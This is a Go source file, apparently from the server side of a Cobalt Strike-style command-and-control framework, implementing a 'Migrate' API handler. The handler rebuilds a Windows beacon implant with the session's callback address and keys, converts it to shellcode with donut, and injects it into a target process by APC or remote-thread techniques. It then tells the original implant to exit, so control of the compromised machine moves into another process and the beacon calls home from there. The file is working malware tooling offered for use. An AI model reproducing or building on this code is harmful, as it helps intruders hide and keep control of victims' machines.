package api

import (
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/delivery"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/godonut"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils/logx"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// Migrate 进程迁移(重上线式,功能批): 将当前会话的 beacon 以 shellcode 形态
// 注入目标进程并令原进程退出。
//
// 实现链路(全部复用既有原语,客户端零改动):
//  1. 按会话的监听器配置重建同配置 EXE(模板 + PatchClientBinary,密钥/连接地址
//     与原会话一致 → 新 beacon 上线后可正常通信)
//  2. godonut 转 shellcode(GenServer 的 bin/hex/c 格式同款管线)
//  3. SendInjectMem 注入目标 pid(复用 INJECT_MEM 通道,tech 默认 apc——
//     目标进程非挂起态时 APC 队列可注入;注入后 shellcode 自行拉起 beacon)
//  4. 新 beacon 以新 PID firstBlood 上线(MetaInfo 含 PID → 新 uid,新会话)
//  5. 延迟 2s 下发 exit 令原进程退出(留窗口确认新会话已上线)
//
// 语义注意: 与 CS migrate 一致,迁移后会话 uid 变化(新会话接棒,旧会话离线)。
// V1 仅支持 Windows 客户端(donut 仅转换 PE;InjectMem 亦为 Windows-only)。
//
// 请求: { uid, pid, tech(可选,默认 apc) }
func Migrate(c *gin.Context) {
	var body struct {
		Uid  string `json:"uid"`
		Pid  int    `json:"pid"`
		Tech string `json:"tech"`
	}
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if body.Pid <= 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "pid 必须为正整数"})
		return
	}
	switch body.Tech {
	case "", "auto", "ntc", "apc", "crt":
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "tech 仅支持 auto/ntc/apc/crt"})
		return
	}
	if body.Tech == "" {
		body.Tech = "apc" // 迁移目标通常为运行中的正常进程,APC 优于远程线程
	}

	// 1. 会话与监听器信息
	var client database.Clients
	has, err := database.DB().Where("uid = ?", body.Uid).Get(&client)
	if err != nil || !has {
		c.JSON(http.StatusBadRequest, gin.H{"error": "会话不存在"})
		return
	}
	if !strings.EqualFold(client.Os, "windows") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "V1 仅支持 Windows 会话迁移(donut 仅转换 PE)"})
		return
	}
	// 协作：迁移会重启会话进程，被他人锁定时拒绝
	if !checkSessionLock(c, body.Uid) {
		return
	}
	listenerType := client.Listener
	// clients.Arch 为 "x64"/"x86"(MetaInfo flag 位),模板文件名需 amd64/386
	archType := "amd64"
	if client.Arch == "x86" || strings.Contains(strings.ToLower(client.Arch), "386") {
		archType = "386"
	}

	// 2. 监听器连接地址与密钥(重建 beacon 必须与原会话同源)
	// 优先按该客户端实际连接的监听器定位：同类型多实例时按类型查只能取到任意一行，
	// 迁移出的 beacon 会带着另一个监听器的地址与密钥
	listener, lHas := listenerForClient(client.Uid, listenerType)
	if !lHas || listener.Status != 1 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "监听器不存在或未启用: " + listenerType})
		return
	}
	connectAddress := listener.ConnectAddress
	if connectAddress == "" {
		connectAddress = listener.ListenAddress
	}
	// 密钥取该记录自身的（与连接侧派生、客户端 patch 同源）
	vkey, salt := encrypt.NormalizeListenerKeyConfig([]byte(listener.VKey), []byte(listener.EncryptionSalt))
	if err := encrypt.ValidateListenerKeyConfigForStart(listener.VKey, listener.EncryptionSalt); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "监听器密钥不可用，拒绝迁移(J4): " + err.Error()})
		return
	}

	// 3. 读模板 + patch(与 GenServer 同款管线,仅必填项)
	binaryFileName := findBinary(listenerType, "windows", archType)
	if binaryFileName == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("未找到模板: %s/windows/%s", listenerType, archType)})
		return
	}
	binaryData, err := readTemplate(listenerType, binaryFileName)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "读取客户端模板失败"})
		return
	}

	// ExecuteKey: 随机生成(客户端本地反沙箱校验,不与服务端比对,无需与原会话一致)
	executeKeyBytes := make([]byte, 8)
	rand.Read(executeKeyBytes)
	executeKey := hex.EncodeToString(executeKeyBytes)

	jitterStr := ""
	if g := config.GetGlobalConfig(); g != nil && g.Client.Jitter >= 0 && g.Client.Jitter <= 50 {
		jitterStr = strconv.Itoa(g.Client.Jitter)
	}

	patched, err := delivery.PatchClientBinary(binaryData, delivery.PatchOptions{
		ListenerConfig: listenerType + "://" + connectAddress,
		OS:             "windows",
		Arch:           archType,
		Pass:           executeKey,
		VKey:           string(vkey),
		EncryptSalt:    string(salt),
		JitterPercent:  jitterStr,
		QuietMode:      "1",
		Format:         "raw",
	})
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "重建客户端失败: " + err.Error()})
		return
	}

	// 4. donut 转 shellcode(注入形态)
	sc, err := godonut.GenShellcode(patched, executeKey, archType)
	if err != nil || len(sc) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("donut 转换失败: %v", err)})
		return
	}

	// 5. 会话须在线
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[body.Uid]
	connection.MuClientListenerType.Unlock()
	if !exists {
		c.JSON(http.StatusBadRequest, gin.H{"error": "客户端未连接或已断开"})
		return
	}

	// 6. 注入目标进程(INJECT_MEM 通道)
	sent, seq, err := SendInjectMem(body.Uid, sc, body.Pid, body.Tech)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "迁移注入下发失败: " + err.Error()})
		return
	}
	logx.Infof("🔀 [MIGRATE] UID=%s → PID=%d (tech=%s, shellcode=%dB/%d块), 等待新会话上线\n",
		body.Uid, body.Pid, body.Tech, sent, seq)

	// 7. 延迟 2s 退出原进程(给新 beacon firstBlood 留窗口;若新会话未上线,
	// 原进程已退出 —— 迁移失败可见于会话列表,可重新投放)
	go func() {
		time.Sleep(2 * time.Second)
		sendcommand.SendCommand(body.Uid, "exit")
	}()

	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{
		"uid":          body.Uid,
		"pid":          body.Pid,
		"tech":         body.Tech,
		"bytes":        sent,
		"chunks":       seq,
		"note":         "新 beacon 将以新 PID 上线为新会话,原会话即将退出",
	}})
}
